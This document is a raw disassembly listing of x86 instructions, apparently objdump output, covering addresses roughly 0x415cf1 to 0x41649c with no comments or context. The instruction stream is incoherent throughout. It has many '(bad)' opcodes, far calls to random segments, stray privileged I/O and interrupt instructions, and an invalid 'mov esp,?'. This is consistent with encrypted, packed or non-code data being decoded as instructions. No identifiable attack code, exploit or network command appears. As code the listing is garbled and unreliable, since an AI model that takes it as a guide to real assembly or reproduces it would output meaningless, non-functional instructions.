  415cf1:	jg     0x415d32
  415cf3:	icebp  
  415cf4:	ror    DWORD PTR [eax],1
  415cf6:	into   
  415cf7:	jecxz  0x415c81
  415cf9:	add    eax,0xab33ed93
  415cfe:	nop
  415cff:	and    DWORD PTR [edi],0x6
  415d02:	push   cs
  415d03:	dec    esi
  415d04:	arpl   WORD PTR [ebx-0x44],sp
  415d07:	out    dx,al
  415d08:	mov    edx,0xe1dc24b8
  415d0d:	in     al,0x8b
  415d0f:	hlt    
  415d10:	push   ecx
  415d11:	pusha  
  415d12:	leave  
  415d13:	xchg   ecx,eax
  415d14:	call   0x5e2a:0x5c35edfd
  415d1b:	mov    edi,0xaaee371b
  415d20:	cdq    
  415d21:	(bad)
  415d24:	es mov cl,0x48
  415d27:	repz mov eax,ds:0xfb9d4f0c
  415d2d:	pop    es
  415d2e:	xlat   BYTE PTR ds:[ebx]
  415d2f:	(bad)  
  415d31:	push   ebx
  415d32:	sbb    BYTE PTR [edi],bh
  415d34:	retf   
  415d35:	pusha  
  415d36:	lods   al,BYTE PTR ds:[esi]
  415d37:	jno    0x415d28
  415d39:	sbb    DWORD PTR [ebx-0x54],edx
  415d3c:	icebp  
  415d3d:	pusha  
  415d3e:	(bad)  
  415d3f:	sub    al,0xcf
  415d41:	dec    ebx
  415d42:	pusha  
  415d43:	cmp    dl,BYTE PTR [edx-0x43a871f]
  415d49:	push   0xffffffff
  415d4b:	je     0x415da8
  415d4d:	dec    edx
  415d4e:	and    BYTE PTR ds:0xb56c14f,dh
  415d54:	nop
  415d55:	pop    ds
  415d56:	std    
  415d57:	jmp    DWORD PTR ds:0x6b235b24
  415d5d:	popa   
  415d5e:	sub    eax,0xba317aef
  415d63:	xchg   BYTE PTR [ecx],bl
  415d65:	in     al,dx
  415d66:	stos   BYTE PTR es:[edi],al
  415d67:	test   BYTE PTR [ebp-0xf],ah
  415d6a:	sub    BYTE PTR [ecx+0x7d6eaf67],0x10
  415d71:	outs   dx,DWORD PTR ds:[esi]
  415d72:	es inc ebp
  415d74:	pop    eax
  415d75:	push   cs
  415d76:	(bad)  
  415d77:	rol    bl,1
  415d79:	pop    eax
  415d7a:	mov    eax,0x6e7d1240
  415d7f:	mov    ebp,0x6b580ca2
  415d84:	and    al,0xb1
  415d86:	xchg   esi,eax
  415d87:	and    DWORD PTR [ebx],ecx
  415d89:	in     al,dx
  415d8a:	mov    ah,0x89
  415d8c:	cmp    BYTE PTR [esi-0x4875932],bh
  415d92:	xor    al,0xe3
  415d94:	adc    DWORD PTR [edi+0x2c],edx
  415d97:	mov    WORD PTR [eax+edx*4+0x495e433b],fs
  415d9e:	mov    esi,0xb8145f65
  415da3:	dec    ebx
  415da4:	pop    edi
  415da5:	add    ebx,DWORD PTR [ebp-0x71]
  415da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415da9:	dec    ebx
  415daa:	adc    al,bh
  415dac:	arpl   WORD PTR [edx],ax
  415dae:	add    DWORD PTR [ebp+eiz*1+0xb],0xffffff92
  415db3:	mov    edi,0xb0fa18ff
  415db8:	pop    ebp
  415db9:	addr16 jne 0x415dc2
  415dbc:	aas    
  415dbd:	jno    0x415e36
  415dbf:	pop    es
  415dc0:	pusha  
  415dc1:	xor    BYTE PTR [ebp+0x2257bfe],ah
  415dc7:	cs dec ecx
  415dc9:	les    edi,FWORD PTR [ecx-0x3fe57a3d]
  415dcf:	imul   esp
  415dd1:	and    dl,bh
  415dd3:	xor    DWORD PTR [esi-0xe],eax
  415dd6:	pop    ebx
  415dd7:	out    0x8c,al
  415dd9:	or     edi,DWORD PTR [ebp+0x20dbf6fe]
  415ddf:	and    eax,ebx
  415de1:	call   0x2564:0xf300697b
  415de8:	xor    DWORD PTR [ebp+0x4],0xffffffaf
  415dec:	push   ss
  415ded:	aas    
  415dee:	or     edi,DWORD PTR [eax+0x6e]
  415df1:	jmp    0x415d9e
  415df3:	mov    edi,DWORD PTR [esi+eax*4]
  415df6:	sub    al,0x6f
  415df8:	xor    al,0xf8
  415dfa:	ds ss and eax,0x182dd98d
  415e01:	inc    eax
  415e02:	aam    0x54
  415e04:	pop    edx
  415e05:	lea    edx,ds:0x713c64cf
  415e0b:	or     bl,ch
  415e0d:	or     al,0xf6
  415e0f:	jmp    0x7b09:0x671ad1a6
  415e16:	jbe    0x415e21
  415e18:	movups xmm0,xmm6
  415e1b:	cdq    
  415e1c:	pop    ss
  415e1d:	aaa    
  415e1e:	and    al,0x57
  415e20:	push   esi
  415e21:	scas   al,BYTE PTR es:[edi]
  415e22:	cmp    al,0x28
  415e24:	inc    esp
  415e25:	aam    0x97
  415e27:	fnstsw WORD PTR [eax]
  415e29:	adc    eax,DWORD PTR [eax]
  415e2b:	push   cs
  415e2c:	inc    ecx
  415e2d:	or     dh,BYTE PTR [edx+0x53b79400]
  415e33:	mov    eax,0xeec43a5e
  415e38:	jno    0x415e9a
  415e3a:	cdq    
  415e3b:	test   eax,0xd03c44da
  415e40:	jo     0x7f0d3187
  415e46:	div    DWORD PTR [edx]
  415e48:	hlt    
  415e49:	dec    eax
  415e4a:	fisttp DWORD PTR [ebp-0x44]
  415e4d:	scas   al,BYTE PTR es:[edi]
  415e4e:	out    dx,al
  415e4f:	adc    al,0xdc
  415e51:	inc    esi
  415e52:	jg     0x415df3
  415e54:	add    eax,0x84169368
  415e59:	cdq    
  415e5a:	mov    dl,0x59
  415e5c:	popa   
  415e5d:	mov    ds:0x49b44e5a,al
  415e62:	loop   0x415e71
  415e64:	pop    ss
  415e65:	ffree  st(7)
  415e67:	inc    edx
  415e68:	xchg   esi,eax
  415e69:	adc    al,BYTE PTR [ebx]
  415e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e6c:	stc    
  415e6d:	aam    0x3e
  415e6f:	(bad)  
  415e70:	xchg   esi,eax
  415e71:	call   0xe10d:0xdf58bac3
  415e78:	push   esi
  415e79:	mov    bl,0xfe
  415e7b:	clc    
  415e7c:	xor    al,al
  415e7e:	fbstp  TBYTE PTR [edx]
  415e80:	add    DWORD PTR [edx],0x5f5987bd
  415e86:	dec    edx
  415e87:	jge    0x415e52
  415e89:	add    DWORD PTR [edi-0x66],eax
  415e8c:	lea    ebx,[ecx]
  415e8e:	dec    ebp
  415e8f:	jns    0x415efb
  415e91:	retf   
  415e92:	mov    ah,0x93
  415e94:	sahf   
  415e95:	add    al,0xd7
  415e97:	ins    BYTE PTR es:[edi],dx
  415e98:	int    0xea
  415e9a:	adc    eax,0xa35f15ab
  415e9f:	push   0x8f3fbb4c
  415ea4:	lods   al,BYTE PTR ds:[esi]
  415ea5:	sub    eax,0x23c19fff
  415eaa:	jo     0x415f24
  415eac:	xchg   ebx,eax
  415ead:	jne    0x415e5c
  415eaf:	pop    ecx
  415eb0:	aad    0xdf
  415eb2:	retf   
  415eb3:	cdq    
  415eb4:	cwde   
  415eb5:	and    esi,esi
  415eb7:	outs   dx,DWORD PTR ds:[esi]
  415eb8:	lods   al,BYTE PTR ds:[esi]
  415eb9:	jecxz  0x415ea8
  415ebb:	daa    
  415ebc:	inc    esi
  415ebd:	and    ebp,ebx
  415ebf:	add    al,al
  415ec1:	push   0x8dd5ebed
  415ec6:	push   DWORD PTR [esi+0x57]
  415ec9:	inc    ecx
  415eca:	int3   
  415ecb:	imul   esi,DWORD PTR [esi],0x7423c119
  415ed1:	sub    eax,0xa03f1390
  415ed6:	lahf   
  415ed7:	imul   ebp,DWORD PTR cs:[eax],0xffffff81
  415edb:	add    eax,0xa2d6ba78
  415ee0:	mov    bh,al
  415ee2:	inc    esi
  415ee3:	xor    ah,cl
  415ee5:	retf   
  415ee6:	test   eax,0xa18102fc
  415eeb:	push   cs
  415eec:	ins    DWORD PTR es:[edi],dx
  415eed:	ret    0x4c7c
  415ef0:	shr    ebp,cl
  415ef2:	adc    al,0x39
  415ef4:	pop    ebp
  415ef5:	in     al,dx
  415ef6:	sub    bl,dl
  415ef8:	mov    bh,0xd9
  415efa:	retf   
  415efb:	lods   eax,DWORD PTR ds:[esi]
  415efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415efd:	ficom  WORD PTR [eax]
  415eff:	xchg   edi,eax
  415f00:	repz jl 0x415ed5
  415f03:	daa    
  415f04:	jne    0x415f76
  415f06:	mov    cl,0x93
  415f08:	and    ebp,esp
  415f0a:	xchg   BYTE PTR [eax],dh
  415f0c:	repz dec esi
  415f0e:	daa    
  415f0f:	push   ebx
  415f10:	lods   eax,DWORD PTR ds:[esi]
  415f11:	cs xor eax,0x723a5b67
  415f17:	jl     0x415f2f
  415f19:	test   al,0x4d
  415f1b:	cmp    eax,0xccb35e69
  415f20:	stos   BYTE PTR es:[edi],al
  415f21:	test   DWORD PTR [ecx-0x9],0x7a1f34c3
  415f28:	mov    cl,0x85
  415f2a:	fidivr WORD PTR [esi+0xf]
  415f2d:	dec    esp
  415f2e:	stos   DWORD PTR es:[edi],eax
  415f2f:	sbb    BYTE PTR [eax],bl
  415f31:	call   0x47778523
  415f36:	enter  0x9bf9,0xf2
  415f3a:	push   ebx
  415f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f3c:	push   ebx
  415f3d:	or     BYTE PTR [edx+0xd2e5b04],bh
  415f43:	aas    
  415f44:	sbb    al,0xbe
  415f46:	ins    DWORD PTR es:[edi],dx
  415f47:	or     eax,0x41beda69
  415f4c:	shl    DWORD PTR [ebp+0x40],cl
  415f4f:	pop    ds
  415f50:	jmp    DWORD PTR [ebx]
  415f52:	or     ebx,DWORD PTR [ebx-0x55]
  415f55:	aas    
  415f56:	pop    edi
  415f57:	imul   ebp,DWORD PTR [ebx+0x60],0x57
  415f5b:	les    ebx,FWORD PTR [esi]
  415f5d:	jne    0x415f30
  415f5f:	mov    ecx,0x9946090c
  415f64:	aas    
  415f65:	jns    0x415ef6
  415f67:	push   cs
  415f68:	out    dx,al
  415f69:	inc    ebx
  415f6a:	div    DWORD PTR [edx-0x9]
  415f6d:	cwde   
  415f6e:	bound  esi,QWORD PTR [ebx]
  415f70:	cdq    
  415f71:	adc    eax,0x70ea1db6
  415f76:	cdq    
  415f77:	jle    0x415fd7
  415f79:	aaa    
  415f7a:	imul   edx,DWORD PTR [esi+0x5c],0x54
  415f7e:	and    bh,BYTE PTR [esi-0x26c3d504]
  415f84:	call   0x2b5b:0x4a69f060
  415f8b:	leave  
  415f8c:	loope  0x415f60
  415f8e:	std    
  415f8f:	(bad)  
  415f90:	icebp  
  415f91:	mov    ds:0x950ffd64,eax
  415f96:	leave  
  415f97:	add    DWORD PTR [edx+esi*4],ebp
  415f9a:	shl    DWORD PTR [edx],1
  415f9c:	pop    esi
  415f9d:	adc    al,0x16
  415f9f:	je     0x415f3f
  415fa1:	call   0x6d92:0x377ed2fc
  415fa8:	push   es
  415fa9:	hlt    
  415faa:	mov    ch,0xcb
  415fac:	aad    0xd1
  415fae:	cmp    esp,DWORD PTR [eax-0x3fb0685c]
  415fb4:	adc    al,al
  415fb6:	retf   0x9403
  415fb9:	cmp    ebp,edi
  415fbb:	pop    esi
  415fbc:	and    eax,0x87d6453
  415fc1:	sub    ecx,DWORD PTR [ebp+0x482b2143]
  415fc7:	dec    ebp
  415fc8:	jg     0x415f61
  415fca:	in     eax,dx
  415fcb:	dec    ebp
  415fcc:	dec    edi
  415fcd:	fcom   QWORD PTR [eax+0x668ab6c4]
  415fd3:	retf   0x73a1
  415fd6:	mov    esp,0x3bc28b09
  415fdb:	adc    DWORD PTR [ecx],ebp
  415fdd:	rcl    BYTE PTR [edi],1
  415fdf:	mov    edx,0x51160f32
  415fe4:	pop    ss
  415fe5:	add    BYTE PTR [edx],dh
  415fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fe8:	mov    edx,esp
  415fea:	leave  
  415feb:	sub    DWORD PTR [edi+0x7489950e],ecx
  415ff1:	sbb    eax,0x24dad714
  415ff6:	sahf   
  415ff7:	mov    cl,0x73
  415ff9:	xchg   ebp,eax
  415ffa:	adc    ebx,DWORD PTR [ebx+eiz*2+0x4a18736c]
  416001:	dec    edx
  416002:	xchg   esi,eax
  416003:	jecxz  0x416013
  416005:	call   0xfb19:0xdc66a58f
  41600c:	fld    TBYTE PTR [eax+0x7ae488dc]
  416012:	ret    0x4187
  416015:	arpl   cx,di
  416017:	xlat   BYTE PTR ds:[ebx]
  416018:	mov    al,0xdc
  41601a:	push   ecx
  41601b:	fwait
  41601c:	and    ecx,esi
  41601e:	push   cs
  41601f:	jne    0x416050
  416021:	xchg   edi,eax
  416022:	shr    DWORD PTR ds:0xbe14dddf,0x7f
  416029:	jp     0x41602c
  41602b:	fst    DWORD PTR [esi+0x14f42834]
  416031:	cwde   
  416032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416033:	or     al,0xb0
  416035:	mov    dh,0xce
  416037:	in     eax,dx
  416038:	sbb    DWORD PTR ds:0xeae28a4f,esp
  41603e:	push   0x54
  416040:	enter  0x9de6,0x24
  416044:	mov    ebp,edi
  416046:	jl     0x4160a3
  416048:	jge    0x415ffb
  41604a:	shl    ch,cl
  41604c:	sti    
  41604d:	push   es
  41604e:	sub    ecx,esi
  416050:	repnz cli 
  416052:	clc    
  416053:	dec    ecx
  416054:	scas   al,BYTE PTR es:[edi]
  416055:	retf   0x980d
  416058:	mov    DWORD PTR [edi],ebp
  41605a:	lea    ebp,[ecx]
  41605c:	inc    esi
  41605d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41605e:	and    dh,BYTE PTR [ebp+0x65]
  416061:	jmp    0x97b5:0x1f5007ac
  416068:	push   edx
  416069:	cmp    eax,0x8f053b0e
  41606e:	pushf  
  41606f:	dec    edx
  416070:	stc    
  416071:	cmp    ah,BYTE PTR [edi+0x320f695]
  416077:	add    ch,dh
  416079:	ror    BYTE PTR [eax],1
  41607b:	sub    BYTE PTR [eax-0x6e2a01ab],ch
  416081:	adc    al,0xf4
  416083:	xor    dl,cl
  416085:	mov    esi,0xb5f6f0bd
  41608a:	lock (bad) 
  41608c:	retf   0x6757
  41608f:	push   0xc4e7bd81
  416094:	jecxz  0x4160b3
  416096:	retf   0x432d
  416099:	inc    edx
  41609a:	pop    ecx
  41609b:	xlat   BYTE PTR ds:[ebx]
  41609c:	into   
  41609d:	fst    DWORD PTR [ebp-0xc72c7e8]
  4160a3:	ret    
  4160a4:	adc    al,0x28
  4160a6:	or     al,0x95
  4160a8:	mov    dl,0x9f
  4160aa:	dec    ebx
  4160ab:	in     eax,0xc5
  4160ad:	mov    eax,ds:0x854b6d01
  4160b2:	ret    0xc782
  4160b5:	mov    dl,0x77
  4160b7:	mov    esi,0x5d031ce1
  4160bc:	dec    esp
  4160bd:	repnz rol DWORD PTR [ecx+0x7],cl
  4160c1:	or     bl,ch
  4160c3:	retf   0xa247
  4160c6:	dec    ebp
  4160c7:	sub    ebx,DWORD PTR [edx+0x6f7f82f7]
  4160cd:	mov    ss,edi
  4160cf:	push   esi
  4160d0:	outs   dx,BYTE PTR ds:[esi]
  4160d1:	xlat   BYTE PTR ds:[ebx]
  4160d2:	mov    eax,ds:0x35a783df
  4160d7:	push   cs
  4160d8:	jmp    FWORD PTR [edx]
  4160da:	gs mov al,0xd9
  4160dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160de:	or     bh,BYTE PTR [edi]
  4160e0:	mov    al,0x4c
  4160e2:	mov    esi,0xd149ccc4
  4160e7:	pusha  
  4160e8:	repz (bad) 
  4160ea:	push   edi
  4160eb:	push   esi
  4160ec:	call   0xfd61:0xc9493506
  4160f3:	ds (bad) 
  4160f5:	call   DWORD PTR ds:0x72d6703a
  4160fb:	ja     0x4160be
  4160fd:	xor    eax,0x87c0f48d
  416102:	ins    DWORD PTR es:[edi],dx
  416103:	and    al,0x49
  416105:	xchg   ecx,eax
  416106:	popf   
  416107:	push   cs
  416108:	loope  0x416109
  41610a:	add    al,0xd2
  41610c:	push   ebx
  41610d:	stos   DWORD PTR es:[edi],eax
  41610e:	add    DWORD PTR [ecx+ecx*2-0x24],ebx
  416112:	mov    bh,cl
  416114:	ss cmp eax,0x394f2521
  41611a:	dec    ebx
  41611b:	adc    bl,ch
  41611d:	adc    cl,BYTE PTR [ecx]
  41611f:	pop    ebx
  416120:	test   DWORD PTR [edi-0x26325973],edx
  416126:	xor    eax,0xe6a1c02
  41612b:	xor    ecx,DWORD PTR [ecx*8+0x30e7ddc6]
  416132:	loop   0x416153
  416134:	push   ss
  416135:	dec    esp
  416136:	jg     0x41619b
  416138:	push   ds
  416139:	sti    
  41613a:	mov    dh,dh
  41613c:	push   esi
  41613d:	fidivr DWORD PTR [ebp*1+0x63e24f4a]
  416144:	pop    eax
  416145:	sahf   
  416146:	les    eax,FWORD PTR [edi+0x72e99b14]
  41614c:	(bad)  
  41614d:	daa    
  41614e:	loop   0x41617e
  416150:	das    
  416151:	(bad)  
  416152:	sub    DWORD PTR [eax-0x26],ebp
  416155:	mov    esp,0xcc74dc7d
  41615a:	sti    
  41615b:	jp     0x4160f9
  41615d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41615e:	and    DWORD PTR [ebx-0x2dc8a76e],edi
  416164:	add    bh,BYTE PTR [edx-0x39094050]
  41616a:	cmp    ebp,DWORD PTR [esi-0x47691db9]
  416170:	add    edi,DWORD PTR [ecx]
  416172:	xor    BYTE PTR [ebx+0x2207a8d7],cl
  416178:	cdq    
  416179:	add    al,0xa9
  41617b:	fcom   QWORD PTR [ecx+0x6c55495c]
  416181:	rcl    ah,0xd1
  416184:	and    DWORD PTR [ebx],ebx
  416186:	mov    bl,0x9b
  416188:	sbb    ebx,DWORD PTR [edi]
  41618a:	daa    
  41618b:	aas    
  41618c:	mov    ecx,0x2b12c2da
  416191:	sar    eax,1
  416193:	jmp    0xab89d9bf
  416198:	imul   esi,DWORD PTR [ecx-0x7],0x7c
  41619c:	ficom  WORD PTR [edi]
  41619e:	or     cl,BYTE PTR [ecx-0x45]
  4161a1:	mov    al,ds:0xfe627123
  4161a6:	fist   DWORD PTR [esi+0x70da30f6]
  4161ac:	call   0x28c8:0x50b354ab
  4161b3:	mov    BYTE PTR [ebp+0x5e],cl
  4161b6:	add    eax,ebp
  4161b8:	sub    ch,BYTE PTR [edi]
  4161ba:	mov    esi,ds
  4161bc:	mov    ecx,ss
  4161be:	or     al,0x49
  4161c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161c1:	mov    ah,0xb3
  4161c3:	dec    ecx
  4161c4:	in     al,dx
  4161c5:	jbe    0x4161a5
  4161c7:	xchg   edi,eax
  4161c8:	pop    ebx
  4161c9:	inc    esi
  4161ca:	aaa    
  4161cb:	mov    edx,DWORD PTR [eax]
  4161cd:	cmpxchg BYTE PTR [ebx-0x61671b4c],bh
  4161d4:	adc    DWORD PTR [edi+edi*4],eax
  4161d7:	jle    0x416217
  4161d9:	adc    eax,0x9fb621b7
  4161de:	stos   DWORD PTR es:[edi],eax
  4161df:	jge    0x416202
  4161e1:	xor    eax,0xc7bf602a
  4161e6:	mov    BYTE PTR [edx+0x2a],al
  4161e9:	fstp   st(1)
  4161eb:	loop   0x416193
  4161ed:	js     0x4161a2
  4161ef:	and    eax,0x6a7a9cc8
  4161f4:	sub    BYTE PTR [ebx],0x1a
  4161f7:	sub    bh,BYTE PTR [esi+ebp*8+0x62]
  4161fb:	mov    ch,0x25
  4161fd:	jo     0x416237
  4161ff:	add    al,0x8a
  416201:	pop    ss
  416202:	or     edx,0x9a3ea770
  416208:	stc    
  416209:	sbb    BYTE PTR [esi+ecx*1],0x52
  41620d:	mov    eax,ds:0xd92665e6
  416212:	mov    cl,0x82
  416214:	(bad)  
  416216:	mov    ecx,DWORD PTR [ebx]
  416218:	iret   
  416219:	fimul  DWORD PTR [edi]
  41621b:	sub    al,0xff
  41621d:	jae    0x4161bb
  41621f:	sbb    BYTE PTR [eax+0xc],al
  416222:	cmp    cl,cl
  416224:	sbb    BYTE PTR [edi+0x7],0x97
  416228:	sbb    bl,0x47
  41622b:	push   esi
  41622c:	add    eax,0x73f8b7b8
  416231:	call   0x93fc:0xc3703a12
  416238:	fdiv   DWORD PTR [esi]
  41623a:	sub    DWORD PTR [edi],edx
  41623c:	(bad)  
  41623d:	fisttp QWORD PTR [ecx+0x73]
  416240:	lods   eax,DWORD PTR ds:[esi]
  416241:	inc    eax
  416242:	mov    dh,0x2e
  416244:	lock fimul DWORD PTR [ebx-0x5e]
  416248:	sub    dh,BYTE PTR [edi-0x4a]
  41624b:	lahf   
  41624c:	pop    ebp
  41624e:	sub    bh,BYTE PTR [esi+0x364c43e1]
  416254:	xchg   edi,ecx
  416256:	adc    BYTE PTR [edi],ch
  416258:	or     DWORD PTR [ebp+0x21],ebp
  41625b:	(bad)  
  41625c:	dec    eax
  41625d:	adc    al,0x78
  41625f:	scas   al,BYTE PTR es:[edi]
  416260:	arpl   WORD PTR [edi+0x64604c9e],bp
  416266:	(bad)  
  416267:	sub    BYTE PTR [ebx+edx*1+0x5ade5e2],bl
  41626e:	sbb    eax,0x42bdd8d6
  416273:	pop    edi
  416274:	mov    cl,0x8e
  416276:	jmp    0xa3e94041
  41627b:	js     0x416284
  41627d:	dec    eax
  41627e:	pushf  
  41627f:	(bad)  
  416280:	retf   0xaa87
  416283:	xchg   edx,eax
  416284:	icebp  
  416285:	mov    DWORD PTR es:[ecx],esi
  416288:	sub    ecx,edx
  41628a:	test   BYTE PTR [ebp+0x78],al
  41628d:	add    ebx,ecx
  41628f:	imul   DWORD PTR [esi-0x6a]
  416292:	in     al,0xc0
  416294:	push   esi
  416295:	mov    cl,0x25
  416297:	sahf   
  416298:	cmp    BYTE PTR [edx-0x2451f69e],ah
  41629e:	scas   eax,DWORD PTR es:[edi]
  41629f:	fimul  DWORD PTR [edx+edx*1+0x5]
  4162a3:	das    
  4162a4:	xchg   DWORD PTR [ecx+eax*1],edx
  4162a7:	scas   eax,DWORD PTR es:[edi]
  4162a8:	mov    ah,0x4c
  4162aa:	shl    DWORD PTR [ebp-0x64],cl
  4162ad:	sar    BYTE PTR [ebp-0x41c3bda9],0xc0
  4162b4:	mov    eax,0xd237a544
  4162b9:	push   esp
  4162ba:	iret   
  4162bb:	inc    edi
  4162bc:	shr    BYTE PTR [eax+0x13],0xf4
  4162c0:	mov    ah,0x37
  4162c2:	jne    0x41624f
  4162c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c5:	cmp    eax,0x4548b550
  4162ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162cb:	jmp    DWORD PTR [edx]
  4162ce:	scas   al,BYTE PTR es:[edi]
  4162cf:	fisub  DWORD PTR [edi-0x15]
  4162d2:	scas   eax,DWORD PTR es:[edi]
  4162d3:	jns    0x41630d
  4162d5:	mov    dh,0x8e
  4162d7:	add    DWORD PTR [esi+ebp*8],esi
  4162da:	inc    ebp
  4162db:	inc    edi
  4162dc:	inc    eax
  4162dd:	adc    BYTE PTR [edi-0x17],bl
  4162e0:	cmp    DWORD PTR [ebx+0x3d],eax
  4162e3:	pop    edi
  4162e4:	pop    edi
  4162e5:	daa    
  4162e6:	adc    eax,0x29b8d791
  4162eb:	fsubrp st(3),st
  4162ed:	pushf  
  4162ee:	rep stos DWORD PTR es:[edi],eax
  4162f0:	and    al,0x93
  4162f2:	sub    al,0xde
  4162f4:	scas   al,BYTE PTR es:[edi]
  4162f5:	(bad)  
  4162f6:	pusha  
  4162f7:	mov    bl,0xce
  4162f9:	scas   al,BYTE PTR es:[edi]
  4162fa:	in     al,dx
  4162fb:	jp     0x416284
  4162fd:	ds add al,0xa0
  416300:	cwde   
  416301:	cmp    BYTE PTR [edi],0x20
  416304:	stc    
  416305:	fwait
  416306:	cmp    ebx,DWORD PTR [edi]
  416308:	mov    esp,0x3abd9716
  41630d:	rcr    BYTE PTR [edx+esi*4-0xd30649f],0xd0
  416315:	xor    ebp,edx
  416317:	mov    esp,0x32b8db7
  41631c:	adc    al,0xad
  41631e:	fdivr  st(5),st
  416320:	pushf  
  416321:	rcl    DWORD PTR [ecx-0x4a],0xe5
  416325:	xor    DWORD PTR [edi],ebp
  416327:	(bad)  
  416328:	or     esp,ebp
  41632a:	jmp    0xbbac:0xa76ee302
  416331:	pop    eax
  416332:	aad    0xb9
  416334:	ret    
  416335:	imul   ecx,DWORD PTR [ebx-0x14441bb7],0x8ce5e107
  41633f:	int    0x2c
  416341:	cmp    esi,edx
  416343:	cmp    DWORD PTR [ebx-0x11],eax
  416346:	xor    ebx,DWORD PTR [eax]
  416348:	iret   
  416349:	push   esp
  41634a:	imul   BYTE PTR [ebx+0x8431380]
  416350:	sub    al,0xf2
  416352:	aaa    
  416353:	mov    edx,0xef2051b7
  416358:	push   esp
  416359:	in     al,0x83
  41635b:	fsubrp st(3),st
  41635d:	xor    cl,ch
  41635f:	or     DWORD PTR [esi+0x133eff64],edi
  416365:	cld    
  416366:	aam    0x44
  416368:	inc    edx
  416369:	mov    al,ds:0xb2f0b983
  41636e:	fidiv  WORD PTR [eax+0x47606bbc]
  416374:	add    DWORD PTR [eax-0x54],ecx
  416377:	mov    edx,0xd3b183ec
  41637c:	pusha  
  41637d:	add    ah,cl
  41637f:	xor    DWORD PTR ds:0xa7f7a939,edi
  416385:	fwait
  416386:	or     al,0x7d
  416388:	scas   al,BYTE PTR es:[edi]
  416389:	inc    DWORD PTR [ebx]
  41638b:	add    esp,DWORD PTR [eax]
  41638d:	sub    edi,DWORD PTR [ebx+0x4b]
  416390:	lods   al,BYTE PTR ds:[esi]
  416391:	mov    esp,0x59eaf0e8
  416396:	in     eax,0x25
  416398:	daa    
  416399:	mov    esi,DWORD PTR fs:[ecx+0x41d780e]
  4163a0:	sbb    dh,BYTE PTR [ecx]
  4163a2:	cmc    
  4163a3:	jg     0x4163bb
  4163a5:	or     ch,al
  4163a7:	sbb    edx,edi
  4163a9:	inc    ebx
  4163aa:	cmp    edx,edx
  4163ac:	lods   eax,DWORD PTR ds:[esi]
  4163ad:	jne    0x41641b
  4163af:	xor    bl,0xad
  4163b2:	out    dx,eax
  4163b3:	xor    BYTE PTR [ebp+edx*8-0x6aa2dd4a],0x1c
  4163bb:	xchg   BYTE PTR [esi+0x0],bl
  4163be:	jbe    0x4163be
  4163c0:	and    BYTE PTR [ebx-0x71293a6],ah
  4163c6:	ret    
  4163c7:	inc    esp
  4163c8:	xchg   esi,eax
  4163c9:	call   0x9108:0x64046fa7
  4163d0:	xchg   edx,eax
  4163d1:	push   DWORD PTR [edi]
  4163d3:	jnp    0x41644a
  4163d5:	push   eax
  4163d6:	aad    0x82
  4163d8:	call   0x8095eb03
  4163dd:	mov    esp,0xc9fbca6a
  4163e2:	sbb    DWORD PTR [edx],ebx
  4163e4:	xor    bh,BYTE PTR [edx-0x35a5c69]
  4163ea:	pop    ebp
  4163eb:	cwde   
  4163ec:	pop    esp
  4163ed:	sbb    bh,BYTE PTR [edx-0x7d]
  4163f0:	cmp    bh,BYTE PTR [ebx+0x72]
  4163f3:	add    BYTE PTR [edx],al
  4163f5:	je     0x4163e3
  4163f7:	loop   0x41638f
  4163f9:	ficomp DWORD PTR [ebx]
  4163fb:	dec    esi
  4163fc:	fsub   DWORD PTR [esi-0x54e0209d]
  416402:	adc    eax,0x71595d01
  416407:	mov    BYTE PTR [ecx+0xb361b24],cl
  41640d:	pop    ss
  41640e:	add    al,0xee
  416411:	add    dh,BYTE PTR [ebx+ebp*4]
  416414:	dec    esi
  416415:	call   0x217c74d6
  41641a:	push   ebx
  41641b:	hlt    
  41641c:	mov    dl,bh
  41641e:	leave  
  41641f:	cdq    
  416420:	mov    esp,?
  416422:	outs   dx,DWORD PTR ds:[esi]
  416423:	mov    bl,0xd9
  416425:	lea    ebp,[edx+0xb]
  416428:	inc    esi
  416429:	lds    edx,FWORD PTR [ebx+0x57]
  41642c:	or     bh,dl
  41642e:	es push ds
  416430:	add    ch,BYTE PTR es:[eax+edx*8]
  416434:	mov    bl,0x79
  416436:	or     ah,BYTE PTR [eax]
  416438:	xchg   edi,eax
  416439:	cmp    BYTE PTR [ecx+eax*1],bl
  41643c:	sbb    eax,DWORD PTR [esi+0x12523cce]
  416442:	cld    
  416443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416444:	ins    DWORD PTR es:[edi],dx
  416445:	fsubr  QWORD PTR [eax+0x7c]
  416448:	fsubr  DWORD PTR [esi]
  41644a:	pop    ebp
  41644b:	add    al,dl
  41644d:	jbe    0x4164ad
  41644f:	push   eax
  416450:	inc    esi
  416451:	or     DWORD PTR [ecx-0x63],ebp
  416454:	mov    dl,0x19
  416456:	jnp    0x4164a8
  416458:	xor    al,0x3f
  41645a:	rol    DWORD PTR [ebx+0x5b],cl
  41645d:	mov    fs,edi
  41645f:	pop    ss
  416460:	je     0x416469
  416462:	repz pop ds
  416464:	jo     0x4164da
  416466:	push   ecx
  416467:	fwait
  416468:	dec    ecx
  416469:	retf   0xae14
  41646c:	loope  0x416415
  41646e:	sahf   
  41646f:	pop    ecx
  416470:	sbb    bh,BYTE PTR [edi]
  416472:	and    bh,BYTE PTR [ecx+0x1885a518]
  416478:	mov    cl,0xbd
  41647a:	xor    eax,0xccb724ed
  41647f:	pop    edi
  416480:	fdivp  st(5),st
  416482:	inc    esi
  416483:	add    eax,0x251e0b9
  416488:	or     bh,ah
  41648a:	pop    ebx
  41648b:	mov    dl,0x2b
  41648d:	sbb    DWORD PTR [eax],eax
  41648f:	ja     0x4164bf
  416491:	mov    bh,0x8d
  416493:	sbb    dh,BYTE PTR ds:[ebx]
  416496:	mov    ecx,0xd198f453
  41649b:	clc    
  41649c:	retf   
